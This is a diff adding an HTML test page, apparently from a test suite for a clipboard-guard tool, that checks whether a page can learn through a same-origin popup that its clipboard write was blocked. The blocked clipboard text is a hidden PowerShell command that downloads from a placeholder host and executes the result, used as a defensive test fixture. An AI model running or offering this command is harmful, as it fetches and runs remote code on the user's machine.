@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en"><head><meta charset="utf-8"><title>Read-back from a same-origin popup</title>
+<script src="common.js"></script></head>
+<body><h1>Read-back from a same-origin popup</h1>
+<button id="go">Check</button>
+<script>
+// The page writes a command (blocked), then opens a same-origin popup -- a new top-level
+// browsing context -- and has the popup read the clipboard. If the popup got the
+// placeholder, the page would learn it was blocked. With the fix it reads its own text.
+window.addEventListener("message", e => {
+  if (e.data && e.data.whisperRead !== undefined) {
+    window.__clipguardResult.read = e.data.whisperRead;
+    window.__clipguardResult.done = true;
+  }
+});
+document.getElementById("go").addEventListener("click", async () => {
+  await window.__clipguard.writeText('powershell -w hidden -c "iwr https://evil.invalid/popup | iex"');
+  window.__clipguardResult.done = false;
+  window.open("f3_popup_child.html", "_blank", "width=300,height=200");
+});
+</script>
+</body></html>
